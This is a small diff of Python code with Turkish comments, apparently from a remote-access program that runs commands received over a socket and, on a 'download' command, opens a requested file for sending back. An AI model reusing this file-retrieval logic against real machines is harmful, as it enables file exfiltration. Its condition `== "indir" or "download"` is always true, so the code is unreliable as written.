@@ -47,7 +47,7 @@ while True:
         else:
             # eğer başarılı olursa, boş mesaj gönder
             output = ""
-    if command.lower() == "indir" or "download":
+    if splited_command[0].lower() == "indir" or "download":
         dosya_ismi = baglanti.recv(BUFFER).decode() # istenilen dosyanın adını aldık
         
         file = open(dosya_ismi, "rb") # dosyayı açtık
